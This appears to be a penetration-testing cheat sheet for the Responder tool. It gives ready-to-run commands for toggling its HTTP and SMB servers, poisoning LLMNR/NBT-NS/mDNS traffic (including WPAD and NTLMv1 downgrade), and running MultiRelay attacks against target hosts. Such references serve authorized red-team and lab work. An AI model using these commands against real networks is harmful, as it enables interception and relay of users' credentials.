# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## _url
```
https://github.com/lgandx/Responder
```

## _desc
```
IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay
```

## _links
```
https://github.com/lgandx/Responder
```

## conf - http on
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
```

## conf - http off
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
```

## conf - smb on
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = Off/SMB = On/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
```

## conf - smb off 
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
```

## analyze
```
responder –I <interface> -A
```

## analyze (NTLM V1)
#tag/responder
```
responder –I <interface> -A --lm --disable-ess
```

## poison
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -v –I <interface>
```
## poison with another ip
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -v –I <interface> -e <ip>
```

## poison with wpad file 
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -v -I <interface> --wpad
```

## multirelay attack - user filtered (previous disable HTTP and SMB)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u <user1> <user2>
```

## multirelay attack - all user (previous disable HTTP and SMB)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u ALL
```
